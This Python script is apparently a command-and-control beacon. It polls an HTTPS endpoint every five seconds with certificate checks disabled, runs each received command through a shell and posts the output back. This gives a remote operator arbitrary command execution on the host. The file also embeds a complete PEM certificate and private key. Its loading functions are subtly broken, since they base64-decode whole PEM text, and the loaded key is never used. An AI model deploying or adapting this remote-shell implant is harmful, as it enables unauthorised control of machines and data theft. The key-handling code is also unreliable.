import requests
import subprocess
import time
import base64
import ssl

# Placeholder for certificate and private key contents
CERTIFICATE_B64 = """-----BEGIN CERTIFICATE-----
MIIFHjCCAwagAwIBAgIUCRZJR51CKg0/TII2r1V+Phpwj9EwDQYJKoZIhvcNAQEL
BQAwFjEUMBIGA1UEAwwLZXhhbXBsZS5jb20wHhcNMjQwMjA5MDc1NzA5WhcNMjUw
MjA4MDc1NzA5WjAWMRQwEgYDVQQDDAtleGFtcGxlLmNvbTCCAiIwDQYJKoZIhvcN
AQEBBQADggIPADCCAgoCggIBAOCpTh6pmQ6EqAunaKTa2uPGLctv3/hYPi/M4TES
zKvmo8yfc1YogVIniJawzA//hV6wMswC8+v3j2UNsFB5tz32rh9j3laZSMkpROFR
W48GI7+OPENZONZaNE1kGjC9YcTc9tqhC0csLIV2dFd09oW7HKlKkY2LliHzOGUL
tT8ac45sHoJZnF1oM6APRLApEAhCPJ3xiFR+bHFa0l58csl4Qc2iAYddDUJWt68s
G+FqNl56twDapbCkj2/yRiw3mmlxZmiWZli2zUi1Hr3vN5cjcL8WGyB5Pq8ODGBe
osBaYQtDchKw1+p9TlNATr5oNd64WrxpGxPrlhHl+FS8oi+ITyJgoUS6u8q+RYCU
nNIcRqctytQ/NlT1NeKv9O60NPE3SVKtpmzGanKkB3qppd91pdD8/LQEhCuvDc2U
GBMHkh5UndoWYlG9tOrtYDIZqjNJO6oRcnIrKhjeVFNbLaPBq50QZ3vBMsqM5Yau
WjYRinVGZOTCCvoEKZkdqYb7L6w1nKrlKr8QiC22bKYutlrlkTf/uFyshFP28I3s
kr6LGyoKlkN/HrRHcOtUsskAZiVJcGood09mtfy2g3JeSQo3MhT3/ApErcYevaRn
kAEKYlJuP6svLBmHe8fefXKODd/7ja2F3jp01fwNNztGZFztEwHOcOOvMfnHnLuT
dngvAgMBAAGjZDBiMB0GA1UdDgQWBBSaQ3z9WxuZavOZvgC82B7FvqUCQTAfBgNV
HSMEGDAWgBSaQ3z9WxuZavOZvgC82B7FvqUCQTAPBgNVHRMBAf8EBTADAQH/MA8G
A1UdEQQIMAaHBH8AAAEwDQYJKoZIhvcNAQELBQADggIBAMfEYYBnlHvRVnTNZqPT
WVD+XTJ8NDAwPrGQlalZLQvDd8s3UqOqyrrbOrEiJuNkUx6dSHTlP+ymrMDzk6x/
etazfinL6QPmxROCoP1+kPn/kN1ld0c+QQODm1QEG7O6HAYH3acF6AyLNvwtLRe3
+AO9Z5ncb8jjWGFduoq3gCMBMaRLN3qnhXxc/rf2CtJwvQvF9iy4nmkkxhkhaK+k
FshY0ITRES26wLRmmV3fWAqlvzcIO9h5TTDbKbzwpXk8lKxJJAdhTclVpTuG/yw8
LxeQHo/TO2D7T2wl+AeJSJN7b3uoarskgUwOct4obt1Uu61dtIl/mQrrBNNoPcZ/
jlY8wadXcIglN1Y3M5mqBg5BjVufSB18jQO3rpL2Z3RvMq0mm5gM+MJvsA/xkGYE
WIMu617mpz/5DVfPOsD8k3hEkdvinMxZehMan8rDYYDN7OTH49/HXpMS4xkxTTOi
cMINtR6JxdGKz5qGXFC7xKNZ+9125ChTIjIrcTWy7y/bnuQbxHstVj3MGuPno848
9gcs2vobPStNJx5bYlgEhbbv3/KFzsjWfYCfjkmqUNMIJaIzC16R+PFj9uaMmASi
AVcToNJrrdoSgiQIjRpEgnf01Q4u6sO1KU2rKVoxbqRBH6pvK23LxGO9B8Pn5Icx
GHRa5f/7CNzkENNWE98YET0G
-----END CERTIFICATE-----"""
PRIVATE_KEY_B64 = """-----BEGIN PRIVATE KEY-----
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
2seBGGLqu1n2smRzPDC5h2lUfQaG3fA=
-----END PRIVATE KEY-----"""

# Function to decode Base64 and load as SSL certificate
def load_certificate():
    certificate_data = base64.b64decode(CERTIFICATE_B64.encode() + b'==')
    return certificate_data

# Function to decode Base64 and load as SSL private key
def load_private_key():
    private_key_data = base64.b64decode(PRIVATE_KEY_B64.encode() + b'==')
    return private_key_data

# Endpoints on the server
COMMAND_ENDPOINT = 'https://127.0.0.1:5001/get_command'  # Use HTTPS
OUTPUT_ENDPOINT = 'https://127.0.0.1:5001/output'        # Use HTTPS

def execute_command(command):
    try:
        # Execute the received command using subprocess
        result = subprocess.run(
            command,
            shell=True,
            check=True,  # Raise an exception for non-zero return codes
            text=True,
            capture_output=True  # Capture both stdout and stderr
        )
        return result.stdout
    except subprocess.CalledProcessError as e:
        # Handle non-zero return codes (command execution errors)
        error_message = f"Error executing command: {e}\n"
        if hasattr(e, 'stderr') and e.stderr is not None:
            error_message += f"{e.stderr}\n"
        return error_message
    except Exception as e:
        return f"Error executing command: {e}"

def send_output(output):
    try:
        # Send the output back to the server
        requests.post(OUTPUT_ENDPOINT, data={'output': output}, verify=False)  # Ignore SSL verification
    except requests.exceptions.RequestException as e:
        print(f"Request Error: {e}")

if __name__ == '__main__':
    # Load certificate and private key
    certificate = load_certificate()
    private_key = load_private_key()

    while True:
        try:
            # Request command from the server
            response = requests.get(COMMAND_ENDPOINT, verify=False)  # Ignore SSL verification
            data = response.json()
            command_to_execute = data.get('command', '')

            if command_to_execute:
                print(f"Received Command: {command_to_execute}")
                output = execute_command(command_to_execute)
                print(f"Command Output:\n{output}")

                # Send the output back to the server immediately
                send_output(output)

        except requests.exceptions.RequestException as e:
            print(f"Request Error: {e}")

        time.sleep(5)  # Poll every 5 seconds